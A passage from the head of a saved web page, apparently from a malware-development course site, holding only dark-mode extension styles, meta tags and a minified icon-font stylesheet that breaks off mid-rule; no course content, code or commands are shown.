<!DOCTYPE html>
<html class="dark" data-darkreader-mode="dynamic" data-darkreader-scheme="dark"><script type="text/javascript" src="31_files/inject.js"></script><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--user-agent" media="screen">@layer {
html {
    background-color: var(--darkreader-background-ffffff, #181a1b) !important;
}
html {
    color-scheme: dark !important;
}
iframe {
    color-scheme: dark !important;
}
html, body {
    background-color: var(--darkreader-background-ffffff, #181a1b);
}
html, body {
    border-color: var(--darkreader-border-4c4c4c, #736b5e);
    color: var(--darkreader-text-000000, #e8e6e3);
}
a {
    color: var(--darkreader-text-0040ff, #3391ff);
}
table {
    border-color: var(--darkreader-border-808080, #545b5e);
}
mark {
    color: var(--darkreader-text-000000, #e8e6e3);
}
::placeholder {
    color: var(--darkreader-text-a9a9a9, #b2aba1);
}
input:-webkit-autofill,
textarea:-webkit-autofill,
select:-webkit-autofill {
    background-color: var(--darkreader-background-faffbd, #404400) !important;
    color: var(--darkreader-text-000000, #e8e6e3) !important;
}
* {
    scrollbar-color: var(--darkreader-background-b0b0b0, #454a4d) var(--darkreader-background-f1f1f1, #202324);
}
::selection {
    background-color: var(--darkreader-background-0060d4, #004daa) !important;
    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
}
::-moz-selection {
    background-color: var(--darkreader-background-0060d4, #004daa) !important;
    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
}
}</style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble.gtx-bubble, .captcheck_answer_label > input + img, span#closed_text > img[src^="https://www.gstatic.com/images/branding/googlelogo"], span[data-href^="https://www.hcaptcha.com/"] > #icon, img.Wirisformula, a[data-testid="headerMediumLogo"]>svg, .d2l-navigation-link-image-container, .d2l-iframe-loading-container {
    filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
}</style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
  background-color: var(--darkreader-inline-bgcolor) !important;
}
[data-darkreader-inline-bgimage] {
  background-image: var(--darkreader-inline-bgimage) !important;
}
[data-darkreader-inline-border] {
  border-color: var(--darkreader-inline-border) !important;
}
[data-darkreader-inline-border-bottom] {
  border-bottom-color: var(--darkreader-inline-border-bottom) !important;
}
[data-darkreader-inline-border-left] {
  border-left-color: var(--darkreader-inline-border-left) !important;
}
[data-darkreader-inline-border-right] {
  border-right-color: var(--darkreader-inline-border-right) !important;
}
[data-darkreader-inline-border-top] {
  border-top-color: var(--darkreader-inline-border-top) !important;
}
[data-darkreader-inline-boxshadow] {
  box-shadow: var(--darkreader-inline-boxshadow) !important;
}
[data-darkreader-inline-color] {
  color: var(--darkreader-inline-color) !important;
}
[data-darkreader-inline-fill] {
  fill: var(--darkreader-inline-fill) !important;
}
[data-darkreader-inline-stroke] {
  stroke: var(--darkreader-inline-stroke) !important;
}
[data-darkreader-inline-outline] {
  outline-color: var(--darkreader-inline-outline) !important;
}
[data-darkreader-inline-stopcolor] {
  stop-color: var(--darkreader-inline-stopcolor) !important;
}
[data-darkreader-inline-bg] {
  background: var(--darkreader-inline-bg) !important;
}
[data-darkreader-inline-border-short] {
  border: var(--darkreader-inline-border-short) !important;
}
[data-darkreader-inline-border-bottom-short] {
  border-bottom: var(--darkreader-inline-border-bottom-short) !important;
}
[data-darkreader-inline-border-left-short] {
  border-left: var(--darkreader-inline-border-left-short) !important;
}
[data-darkreader-inline-border-right-short] {
  border-right: var(--darkreader-inline-border-right-short) !important;
}
[data-darkreader-inline-border-top-short] {
  border-top: var(--darkreader-inline-border-top-short) !important;
}
[data-darkreader-inline-invert] {
    filter: invert(100%) hue-rotate(180deg);
}</style><style class="darkreader darkreader--variables" media="screen">:root {
   --darkreader-neutral-background: var(--darkreader-background-ffffff, #181a1b);
   --darkreader-neutral-text: var(--darkreader-text-000000, #e8e6e3);
   --darkreader-selection-background: var(--darkreader-background-0060d4, #004daa);
   --darkreader-selection-text: var(--darkreader-text-ffffff, #e8e6e3);
}</style><style class="darkreader darkreader--root-vars" media="screen"></style>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <link rel="stylesheet" href="31_files/template.css"><style class="darkreader darkreader--sync" media="screen"></style>
        <link rel="shortcut icon" href="https://maldevacademy.com/maldev-icon.png">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="31_files/font-awesome.min.css"><style class="darkreader darkreader--cors" media="screen">.fa{display:inline-block;font:normal normal normal 14px/1 FontAwesome;font-size:inherit;text-rendering:auto;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.fa-lg{font-size:1.33333333em;line-height:.75em;vertical-align:-15%}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-fw{width:1.28571429em;text-align:center}.fa-ul{padding-left:0;margin-left:2.14285714em;list-style-type:none}.fa-ul>li{position:relative}.fa-li{position:absolute;left:-2.14285714em;width:2.14285714em;top:.14285714em;text-align:center}.fa-li.fa-lg{left:-1.85714286em}.fa-border{padding:.2em .25em .15em;border:solid .08em #eee;border-radius:.1em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left{margin-right:.3em}.fa.fa-pull-right{margin-left:.3em}.pull-right{float:right}.pull-left{float:left}.fa.pull-left{margin-right:.3em}.fa.pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}.fa-rotate-90{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";-webkit-transform:scale(-1, 1);-ms-transform:scale(-1, 1);transform:scale(-1, 1)}.fa-flip-vertical{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";-webkit-transform:scale(1, -1);-ms-transform:scale(1, -1);transform:scale(1, -1)}:root .fa-rotate-90,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-flip-horizontal,:root .fa-flip-vertical{filter:none}.fa-stack{position:relative;display:inline-block;width:2em;height:2em;line-height:2em;vertical-align:middle}.fa-stack-1x,.fa-stack-2x{position:absolute;left:0;width:100%;text-align:center}.fa-stack-1x{line-height:inherit}.fa-stack-2x{font-size:2em}.fa-inverse{color:#fff}.fa-glass:before{content:"\f000"}.fa-music:before{content:"\f001"}.fa-search:before{content:"\f002"}.fa-envelope-o:before{content:"\f003"}.fa-heart:before{content:"\f004"}.fa-star:before{content:"\f005"}.fa-star-o:before{content:"\f006"}.fa-user:before{content:"\f007"}.fa-film:before{content:"\f008"}.fa-th-large:before{content:"\f009"}.fa-th:before{content:"\f00a"}.fa-th-list:before{content:"\f00b"}.fa-check:before{content:"\f00c"}.fa-remove:before,.fa-close:before,.fa-times:before{content:"\f00d"}.fa-search-plus:before{content:"\f00e"}.fa-search-minus:before{content:"\f010"}.fa-power-off:before{content:"\f011"}.fa-signal:before{content:"\f012"}.fa-gear:before,.fa-cog:before{content:"\f013"}.fa-trash-o:before{content:"\f014"}.fa-home:before{content:"\f015"}.fa-file-o:before{content:"\f016"}.fa-clock-o:before{content:"\f017"}.fa-road:before{content:"\f018"}.fa-download:before{content:"\f019"}.fa-arrow-circle-o-down:before{content:"\f01a"}.fa-arrow-circle-o-up:before{content:"\f01b"}.fa-inbox:before{content:"\f01c"}.fa-play-circle-o:before{content:"\f01d"}.fa-rotate-right:before,.fa-repeat:before{content:"\f01e"}.fa-refresh:before{content:"\f021"}.fa-list-alt:before{content:"\f022"}.fa-lock:before{content:"\f023"}.fa-flag:before{content:"\f024"}.fa-headphones:before{content:"\f025"}.fa-volume-off:before{content:"\f026"}.fa-volume-down:before{content:"\f027"}.fa-volume-up:before{content:"\f028"}.fa-qrcode:before{content:"\f029"}.fa-barcode:before{content:"\f02a"}.fa-tag:before{content:"\f02b"}.fa-tags:before{content:"\f02c"}.fa-book:before{content:"\f02d"}.fa-bookmark:before{content:"\f02e"}.fa-print:before{content:"\f02f"}.fa-camera:before{content:"\f030"}.fa-font:before{content:"\f031"}.fa-bold:before{content:"\f032"}.fa-italic:before{content:"\f033"}.fa-text-height:before{content:"\f034"}.fa-text-width:before{content:"\f035"}.fa-align-left:before{content:"\f036"}.fa-align-center:before{content:"\f037"}.fa-align-right:before{content:"\f038"}.fa-align-justify:before{content:"\f039"}.fa-list:before{content:"\f03a"}.fa-dedent:before,.fa-outdent:before{content:"\f03b"}.fa-indent:before{content:"\f03c"}.fa-video-camera:before{content:"\f03d"}.fa-photo:before,.fa-image:before,.fa-picture-o:before{content:"\f03e"}.fa-pencil:before{content:"\f040"}.fa-map-marker:before{content:"\f041"}.fa-adjust:before{content:"\f042"}.fa-tint:before{content:"\f043"}.fa-edit:before,.fa-pencil-square-o:before{content:"\f044"}.fa-share-square-o:before{content:"\f045"}.fa-check-square-o:before{content:"\f046"}.fa-arrows:before{content:"\f047"}.fa-step-backward:before{content:"\f048"}.fa-fast-backward:before{content:"\f049"}.fa-backward:before{content:"\f04a"}.fa-play:before{content:"\f04b"}.fa-pause:before{content:"\f04c"}.fa-stop:before{content:"\f04d"}.fa-forward:before{content:"\f04e"}.fa-fast-forward:before{content:"\f050"}.fa-step-forward:before{content:"\f051"}.fa-eject:before{content:"\f052"}.fa-chevron-left:before{content:"\f053"}.fa-chevron-right:before{content:"\f054"}.fa-plus-circle:before{content:"\f055"}.fa-minus-circle:before{content:"\f056"}.fa-times-circle:before{content:"\f057"}.fa-check-circle:before{content:"\f058"}.fa-question-circle:before{content:"\f059"}.fa-info-circle:before{content:"\f05a"}.fa-crosshairs:before{content:"\f05b"}.fa-times-circle-o:before{content:"\f05c"}.fa-check-circle-o:before{content:"\f05d"}.fa-ban:before{content:"\f05e"}.fa-arrow-left:before{content:"\f060"}.fa-arrow-right:before{content:"\f061"}.fa-arrow-up:before{content:"\f062"}.fa-arrow-down:before{content:"\f063"}.fa-mail-forward:before,.fa-share:before{content:"\f064"}.fa-expand:before{content:"\f065"}.fa-compress:before{content:"\f066"}.fa-plus:before{content:"\f067"}.fa-minus:before{content:"\f068"}.fa-asterisk:before{content:"\f069"}.fa-exclamation-circle:before{content:"\f06a"}.fa-gift:before{content:"\f06b"}.fa-leaf:before{content:"\f06c"}.fa-fire:before{content:"\f06d"}.fa-eye:before{content:"\f06e"}.fa-eye-slash:before{content:"\f070"}.fa-warning:before,.fa-exclamation-triangle:before{content:"\f071"}.fa-plane:before{content:"\f072"}.fa-calendar:before{content:"\f073"}.fa-random:before{content:"\f074"}.fa-comment:before{content:"\f075"}.fa-magnet:before{content:"\f076"}.fa-chevron-up:before{content:"\f077"}.fa-chevron-down:before{content:"\f078"}.fa-retweet:before{content:"\f079"}.fa-shopping-cart:before{content:"\f07a"}.fa-folder:before{content:"\f07b"}.fa-folder-open:before{content:"\f07c"}.fa-arrows-v:before{content:"\f07d"}.fa-arrows-h:before{content:"\f07e"}.fa-bar-chart-o:before,.fa-bar-chart:before{content:"\f080"}.fa-twitter-square:before{content:"\f081"}.fa-facebook-square:before{content:"\f082"}.fa-camera-retro:before{content:"\f083"}.fa-key:before{content:"\f084"}.fa-gears:before,.fa-cogs:before{content:"\f085"}.fa-comments:before{content:"\f086"}.fa-thumbs-o-up:before{content:"\f087"}.fa-thumbs-o-down:before{content:"\f088"}.fa-star-half:before{content:"\f089"}.fa-heart-o:before{content:"\f08a"}.fa-sign-out:before{content:"\f08b"}.fa-linkedin-square:before{content:"\f08c"}.fa-thumb-tack:before{content:"\f08d"}.fa-external-link:before{content:"\f08e"}.fa-sign-in:before{content:"\f090"}.fa-trophy:before{content:"\f091"}.fa-github-square:before{content:"\f092"}.fa-upload:before{content:"\f093"}.fa-lemon-o:before{content:"\f094"}.fa-phone:before{content:"\f095"}.fa-square-o:before{content:"\f096"}.fa-bookmark-o:before{content:"\f097"}.fa-phone-square:before{content:"\f098"}.fa-twitter:before{content:"\f099"}.fa-facebook-f:before,.fa-facebook:before{content:"\f09a"}.fa-github:before{content:"\f09b"}.fa-unlock:before{content:"\f09c"}.fa-credit-card:before{content:"\f09d"}.fa-feed:before,.fa-rss:before{content:"\f09e"}.fa-hdd-o:before{content:"\f0a0"}.fa-bullhorn:before{content:"\f0a1"}.fa-bell:before{content:"\f0f3"}.fa-certificate:before{content:"\f0a3"}.fa-hand-o-right:before{content:"\f0a4"}.fa-hand-o-left:before{content:"\f0a5"}.fa-hand-o-up:before{content:"\f0a6"}.fa-hand-o-down:before{content:"\f0a7"}.fa-arrow-circle-left:before{content:"\f0a8"}.fa-arrow-circle-right:before{content:"\f0a9"}.fa-arrow-circle-up:before{content:"\f0aa"}.fa-arrow-circle-down:before{content:"\f0ab"}.fa-globe:before{content:"\f0ac"}.fa-wrench:before{content:"\f0ad"}.fa-tasks:before{content:"\f0ae"}.fa-filter:before{content:"\f0b0"}.fa-briefcase:before{content:"\f0b1"}.fa-arrows-alt:before{content:"\f0b2"}.fa-group:before,.fa-users:before{content:"\f0c0"}.fa-chain:before,.fa-link:before{content:"\f0c1"}.fa-cloud:before{content:"\f0c2"}.fa-flask:before{content:"\f0c3"}.fa-cut:before,.fa-scissors:before{content:"\f0c4"}.fa-copy:before,.fa-files-o:before{content:"\f0c5"}.fa-paperclip:before{content:"\f0c6"}.fa-save:before,.fa-floppy-o:before{content:"\f0c7"}.fa-square:before{content:"\f0c8"}.fa-navicon:before,.fa-reorder:before,.fa-bars:before{content:"\f0c9"}.fa-list-ul:before{content:"\f0ca"}.fa-list-ol:before{content:"\f0cb"}.fa-strikethrough:before{content:"\f0cc"}.fa-underline:before{content:"\f0cd"}.fa-table:before{content:"\f0ce"}.fa-magic:before{content:"\f0d0"}.fa-truck:before{content:"\f0d1"}.fa-pinterest:before{content:"\f0d2"}.fa-pinterest-square:before{content:"\f0d3"}.fa-google-plus-square:before{content:"\f0d4"}.fa-google-plus:before{content:"\f0d5"}.fa-money:before{content:"\f0d6"}.fa-caret-down:before{content:"\f0d7"}.fa-caret-up:before{content:"\f0d8"}.fa-caret-left:before{content:"\f0d9"}.fa-caret-right:before{content:"\f0da"}.fa-columns:before{content:"\f0db"}.fa-unsorted:before,.fa-sort:before{content:"\f0dc"}.fa-sort-down:before,.fa-sort-desc:before{content:"\f0dd"}.fa-sort-up:before,.fa-sort-asc:before{content:"\f0de"}.fa-envelope:before{content:"\f0e0"}.fa-linkedin:before{content:"\f0e1"}.fa-rotate-left:before,.fa-undo:before{content:"\f0e2"}.fa-legal:before,.fa-gavel:before{content:"\f0e3"}.fa-dashboard:before,.fa-tachometer:before{content:"\f0e4"}.fa-comment-o:before{content:"\f0e5"}.fa-comments-o:before{content:"\f0e6"}.fa-flash:before,.fa-bolt:before{content:"\f0e7"}.fa-sitemap:before{content:"\f0e8"}.fa-umbrella:before{content:"\f0e9"}.fa-paste:before,.fa-clipboard:before{content:"\f0ea"}.fa-lightbulb-o:before{content:"\f0eb"}.fa-exchange:before{content:"\f0ec"}.fa-cloud-download:before{content:"\f0ed"}.fa-cloud-upload:before{content:"\f0ee"}.fa-user-md:before{content:"\f0f0"}.fa-stethoscope:before{content:"\f0f1"}.fa-suitcase:before{content:"\f0f2"}.fa-bell-o:before{content:"\f0a2"}.fa-coffee:before{content:"\f0f4"}.fa-cutlery:before{content:"\f0f5"}.fa-file-text-o:before{content:"\f0f6"}.fa-building-o:before{content:"\f0f7"}.fa-hospital-o:before{content:"\f0f8"}.fa-ambulance:before{content:"\f0f9"}.fa-medkit:before{content:"\f0fa"}.fa-fighter-jet:before{content:"\f0fb"}.fa-beer:before{content:"\f0fc"}.fa-h-square:before{content:"\f0fd"}.fa-plus-square:before{content:"\f0fe"}.fa-angle-double-left:before{content:"\f100"}.fa-angle-double-right:before{content:"\f101"}.fa-angle-double-up:before{content:"\f102"}.fa-angle-double-down:before{content:"\f103"}.fa-angle-left:before{content:"\f104"}.fa-angle-right:before{content:"\f105"}.fa-angle-up:before{content:"\f106"}.fa-angle-down:before{content:"\f107"}.fa-desktop:before{content:"\f108"}.fa-laptop:before{content:"\f109"}.fa-tablet:before{content:"\f10a"}.fa-mobile-phone:before,.fa-mobile:before{content:"\f10b"}.fa-circle-o:before{content:"\f10c"}.fa-quote-left:before{content:"\f10d"}.fa-quote-right:before{content:"\f10e"}.fa-spinner:before{content:"\f110"}.fa-circle:before{content:"\f111"}.fa-mail-reply:before,.fa-reply:before{content:"\f112"}.fa-github-alt:before{content:"\f113"}.fa-folder-o:before{content:"\f114"}.fa-folder-open-o:before{content:"\f115"}.fa-smile-o:before{content:"\f118"}.fa-frown-o:before{content:"\f119"}.fa-meh-o:before{content:"\f11a"}.fa-gamepad:before{content:"\f11b"}.fa-keyboard-o:before{content:"\f11c"}.fa-flag-o:before{content:"\f11d"}.fa-flag-checkered:before{content:"\f11e"}.fa-terminal:before{content:"\f120"}.fa-code:before{content:"\f121"}.fa-mail-reply-all:before,.fa-reply-all:before{content:"\f122"}.fa-star-half-empty:before,.fa-star-half-full:before,.fa-star-half-o:before{content:"\f123"}.fa-location-arrow:before{content:"\f124"}.fa-crop:before{content:"\f125"}.fa-code-fork:before{content:"\f126"}.fa-unlink:before,.fa-chain-broken:before{content:"\f127"}.fa-question:before{content:"\f128"}.fa-info:before{content:"\f129"}.fa-exclamation:before{content:"\f12a"}.fa-superscript:before{content:"\f12b"}.fa-subscript:before{content:"\f12c"}.fa-eraser:before{content:"\f12d"}.fa-puzzle-piece:before{content:"\f12e"}.fa-microphone:before{content:"\f130"}.fa-microphone-slash:before{content:"\f131"}.fa-shield:before{content:"\f132"}.fa-calendar-o:before{content:"\f133"}.fa-fire-extinguisher:before{content:"\f134"}.fa-rocket:before{content:"\f135"}.fa-maxcdn:before{content:"\f136"}.fa-chevron-circle-left:before{content:"\f137"}.fa-chevron-circle-right:before{content:"\f138"}.fa-chevron-circle-up:before{content:"\f139"}.fa-chevron-circle-down:before{content:"\f13a"}.fa-html5:before{content:"\f13b"}.fa-css3:before{content:"\f13c"}.fa-anchor:before{content:"\f13d"}.fa-unlock-alt:before{content:"\f13e"}.fa-bullseye:before{content:"\f140"}.fa-ellipsis-h:before{content:"\f141"}.fa-ellipsis-v:before{content:"\f142"}.fa-rss-square:before{content:"\f143"}.fa-play-circle:before{content:"\f144"}.fa-ticket:before{content:"\f145"}.fa-minus-square:before{content:"\f146"}.fa-minus-square-o:before{content:"\f147"}.fa-level-up:before{content:"\f148"}.fa-level-down:before{content:"\f149"}.fa-check-square:before{content:"\f14a"}.fa-pencil-square:before{content:"\f14b"}.fa-external-link-square:before{content:"\f14c"}.fa-share-square:before{content:"\f14d"}.fa-compass:before{content:"\f14e"}.fa-toggle-down:before,.fa-caret-square-o-down:before{content:"\f150"}.fa-toggle-up:before,.fa-caret-square-o-up:before{content:"\f151"}.fa-toggle-right:before,.fa-caret-square-o-right:before{content:"\f152"}.fa-euro:before,.fa-eur:before{content:"\f153"}.fa-gbp:before{content:"\f154"}.fa-dollar:before,.fa-usd:before{content:"\f155"}.fa-rupee:before,.fa-inr:before{content:"\f156"}.fa-cny:before,.fa-rmb:before,.fa-yen:before,.fa-jpy:before{content:"\f157"}.fa-ruble:before,.fa-rouble:before,.fa-rub:before{content:"\f158"}.fa-won:before,.fa-krw:before{content:"\f159"}.fa-bitcoin:before,.fa-btc:before{content:"\f15a"}.fa-file:before{content:"\f15b"}.fa-file-text:before{content:"\f15c"}.fa-sort-alpha-asc:before{content:"\f15d"}.fa-sort-alpha-desc:before{content:"\f15e"}.fa-sort-amount-asc:before{content:"\f160"}.fa-sort-amount-desc:before{content:"\f161"}.fa-sort-numeric-asc:before{content:"\f162"}.fa-sort-numeric-desc:before{content:"\f163"}.fa-thumbs-up:before{content:"\f164"}.fa-thumbs-down:before{content:"\f165"}.fa-youtube-square:before{content:"\f166"}.fa-youtube:before{content:"\f167"}.fa-xing:before{content:"\f168"}.fa-xing-square:before{content:"\f169"}.fa-youtube-play:before{content:"\f16a"}.fa-dropbox:before{content:"\f16b"}.fa-stack-overflow:before{content:"\f16c"}.fa-instagram:before{content:"\f16d"}.fa-flickr:before{content:"\f16e"}.fa-adn:before{content:"\f170"}.fa-bitbucket:before{content:"\f171"}.fa-bitbucket-square:before{content:"\f172"}.fa-tumblr:before{content:"\f173"}.fa-tumblr-square:before{content:"\f174"}.fa-long-arrow-down:before{content:"\f175"}.fa-long-arrow-up:before{content:"\f176"}.fa-long-arrow-left:before{content:"\f177"}.fa-long-arrow-right:before{content:"\f178"}.fa-apple:before{content:"\f179"}.fa-windows:before{content:"\f17a"}.fa-android:before{content:"\f17b"}.fa-linux:before{content:"\f17c"}.fa-dribbble:before{content:"\f17d"}.fa-skype:before{content:"\f17e"}.fa-foursquare:before{content:"\f180"}.fa-trello:before{content:"\f181"}.fa-female:before{content:"\f182"}.fa-male:before{content:"\f183"}.fa-gittip:before,.fa-gratipay:before{content:"\f184"}.fa-sun-o:before{content:"\f185"}.fa-moon-o:before{content:"\f186"}.fa-archive:before{content:"\f187"}.fa-bug:before{content:"\f188"}.fa-vk:before{content:"\f189"}.fa-weibo:before{content:"\f18a"}.fa-renren:before{content:"\f18b"}.fa-pagelines:before{content:"\f18c"}.fa-stack-exchange:before{content:"\f18d"}.fa-arrow-circle-o-right:before{content:"\f18e"}.fa-arrow-circle-o-left:before{content:"\f190"}.fa-toggle-left:before,.fa-caret-square-o-left:before{content:"\f191"}.fa-dot-circle-o:before{content:"\f192"}.fa-wheelchair:before{content:"\f193"}.fa-vimeo-square:before{content:"\f194"}.fa-turkish-lira:before,.fa-try:before{content:"\f195"}.fa-plus-square-o:before{content:"\f196"}.fa-space-shuttle:before{content:"\f197"}.fa-slack:before{content:"\f198"}.fa-envelope-square:before{content:"\f199"}.fa-wordpress:before{content:"\f19a"}.fa-openid:before{content:"\f19b"}.fa-institution:before,.fa-bank:before,.fa-university:before{content:"\f19c"}.fa-mortar-board:before,.fa-graduation-cap:before{content:"\f19d"}.fa-yahoo:before{content:"\f19e"}.fa-google:before{content:"\f1a0"}.fa-reddit:before{content:"\f1a1"}.fa-reddit-square:before{content:"\f1a2"}.fa-stumbleupon-circle:before{content:"\f1a3"}.fa-stumbleupon:before{content:"\f1a4"}.fa-delicious:before{content:"\f1a5"}.fa-digg:before{content:"\f1a6"}.fa-pied-piper-pp:before{content:"\f1a7"}.fa-pied-piper-alt:before{content:"\f1a8"}.fa-drupal:before{content:"\f1a9"}.fa-joomla:before{content:"\f1aa"}.fa-language:before{content:"\f1ab"}.fa-fax:before{content:"\f1ac"}.fa-building:before{content:"\f1ad"}.fa-child:before{content:"\f1ae"}.fa-paw:before{content:"\f1b0"}.fa-spoon:before{content:"\f1b1"}.fa-cube:before{content:"\f1b2"}.fa-cubes:before{content:"\f1b3"}.fa-behance:before{content:"\f1b4"}.fa-behance-square:before{content:"\f1b5"}.fa-steam:before{content:"\f1b6"}.fa-steam-square:before{content:"\f1b7"}.fa-recycle:before{content:"\f1b8"}.fa-automobile:before,.fa-car:before{content:"\f1b9"}.fa-cab:before,.fa-taxi:before{content:"\f1ba"}.fa-tree:before{content:"\f1bb"}.fa-spotify:before{content:"\f1bc"}.fa-deviantart:before{content:"\f1bd"}.fa-soundcloud:before{content:"\f1be"}.fa-database:before{content:"\f1c0"}.fa-file-pdf-o:before{content:"\f1c1"}.fa-file-word-o:before{content:"\f1c2"}.fa-file-excel-o:before{content:"\f1c3"}.fa-file-powerpoint-o:before{content:"\f1c4"}.fa-file-photo-o:before,.fa-file-picture-o:before,.fa-file-image-o:before{content:"\f1c5"}.fa-file-zip-o:before,.fa-file-archive-o:before{content:"\f1c6"}.fa-file-sound-o:before,.fa-file-audio-o:before{content:"\f1c7"}.fa-file-movie-o:before,.fa-file-video-o:before{content:"\f1c8"}.fa-file-code-o:before{content:"\f1c9"}.fa-vine:before{content:"\f1ca"}.fa-codepen:before{content:"\f1cb"}.fa-jsfiddle:before{content:"\f1cc"}.fa-life-bouy:before,.fa-life-buoy:before,.fa-life-saver:before,.fa-support:before,.fa-life-ring:before{content:"\f1cd"}.fa-circle-o-notch:before{content:"\f1ce"}.fa-ra:before,.fa-resistance:before,.fa-rebel:before{content:"\f1d0"}.fa-ge:before,.fa-empire:before{content:"\f1d1"}.fa-git-square:before{content:"\f1d2"}.fa-git:before{content:"\f1d3"}.fa-y-combinator-square:before,.fa-yc-square:before,.fa-hacker-news:before{content:"\f1d4"}.fa-tencent-weibo:before{content:"\f1d5"}.fa-qq:before{content:"\f1d6"}.fa-wechat:before,.fa-weixin:before{content:"\f1d7"}.fa-send:before,.fa-paper-plane:before{content:"\f1d8"}.fa-send-o:before,.fa-paper-plane-o:before{content:"\f1d9"}.fa-history:before{content:"\f1da"}.fa-circle-thin:before{content:"\f1db"}.fa-header:before{content:"\f1dc"}.fa-paragraph:before{content:"\f1dd"}.fa-sliders:before{content:"\f1de"}.fa-share-alt:before{content:"\f1e0"}.fa-share-alt-square:before{content:"\f1e1"}.fa-bomb:before{content:"\f1e2"}.fa-soccer-ball-o:before,.fa-futbol-o:before{content:"\f1e3"}.fa-tty:before{content:"\f1e4"}.fa-binoculars:before{content:"\f1e5"}.fa-plug:before{content:"\f1e6"}.fa-slideshare:before{content:"\f1e7"}.fa-twitch:before{content:"\f1e8"}.fa-yelp:before{content:"\f1e9"}.fa-newspaper-o:before{content:"\f1ea"}.fa-wifi:before{content:"\f1eb"}.fa-calculator:before{content:"\f1ec"}.fa-paypal:before{content:"\f1ed"}.fa-google-wallet:before{content:"\f1ee"}.fa-cc-visa:before{content:"\f1f0"}.fa-cc-mastercard:before{content:"\f1f1"}.fa-cc-discover:before{content:"\f1f2"}.fa-cc-amex:before{content:"\f1f3"}.fa-cc-paypal:before{content:"\f1f4"}.fa-cc-stripe:before{content:"\f1f5"}.fa-bell-slash:before{content:"\f1f6"}.fa-bell-slash-o:before{content:"\f1f7"}.fa-trash:before{content:"\f1f8"}.fa-copyright:before{content:"\f1f9"}.fa-at:before{content:"\f1fa"}.fa-eyedropper:before{content:"\f1fb"}.fa-paint-brush:before{content:"\f1fc"}.fa-birthday-cake:before{content:"\f1fd"}.fa-area-chart:before{content:"\f1fe"}.fa-pie-chart:before{content:"\f200"}.fa-line-chart:before{content:"\f201"}.fa-lastfm:before{content:"\f202"}.fa-lastfm-square:before{content:"\f203"}.fa-toggle-off:before{content:"\f204"}.fa-toggle-on:before{content:"\f205"}.fa-bicycle:before{content:"\f206"}.fa-bus:before{content:"\f207"}.fa-ioxhost:before{content:"\f208"}.fa-angellist:before{content:"\f209"}.fa-cc:before{content:"\f20a"}.fa-shekel:before,.fa-sheqel:before,.fa-ils:before{content:"\f20b"}.fa-meanpath:before{content:"\f20c"}.fa-buysellads:before{content:"\f20d"}.fa-connectdevelop:before{content:"\f20e"}.fa-dashcube:before{content:"\f210"}.fa-forumbee:before{content:"\f211"}.fa-leanpub:before{content:"\f212"}.fa-sellsy:before{content:"\f213"}.fa-shirtsinbulk:before{content:"\f214"}.fa-simplybuilt:before{content:"\f215"}.fa-skyatlas:before{content:"\f216"}.fa-cart-plus:before{content:"\f217"}.fa-cart-arrow-down:before{content:"\f218"}.fa-diamond:before{content:"\f219"}.fa-ship:before{content:"\f21a"}.fa-user-secret:before{content:"\f21b"}.fa-motorcycle:before{content:"\f21c"}.fa-street-view:before{content:"\f21d"}.fa-heartbeat:before{content:"\f21e"}.fa-venus:before{content:"\f221"}.fa-mars:before{content:"\f222"}.fa-mercury:before{content:"\f223"}.fa-intersex:before,.fa-transgender:before{content:"\f224"}.fa-transgender-alt:before{content:"\f225"}.fa-venus-double:before{content:"\f226"}.fa-mars-double:before{content:"\f227"}.fa-venus-mars:before{content:"\f228"}.fa-mars-stroke:before{content:"\f229"}.fa-mars-stroke-v:before{content:"\f22a"}.fa-mars-stroke-h:before{content:"\f22b"}.fa-neuter:before{content:"\f22c"}.fa-genderless:before{content:"\f22d"}.fa-facebook-official:before{content:"\f230"}.fa-pinterest-p:before{content:"\f231"}.fa-whatsapp:before{content:"\f232"}.fa-server:before{content:"\f233"}.fa-user-plus:before{content:"\f234"}.fa-user-times:before{content:"\f235"}.fa-hotel:before,.fa-bed:before{content:"\f236"}.fa-viacoin:before{content:"\f237"}.fa-train:before{content:"\f238"}.fa-subway:before{content:"\f239"}.fa-medium:before{content:"\f23a"}.fa-yc:before,.fa-y-combinator:before{content:"\f23b"}.fa-optin-monster:before{content:"\f23c"}.fa-opencart:before{content:"\f23d"}.fa-expeditedssl:before{content:"\f23e"}.fa-battery-4:before,.fa-battery:before,.fa-battery-full:before{content:"\f240"}.fa-battery-3:before,.fa-battery-three-quarters:before{content:"\f241"}.fa-battery-2:before,.fa-battery-half:before{content:"\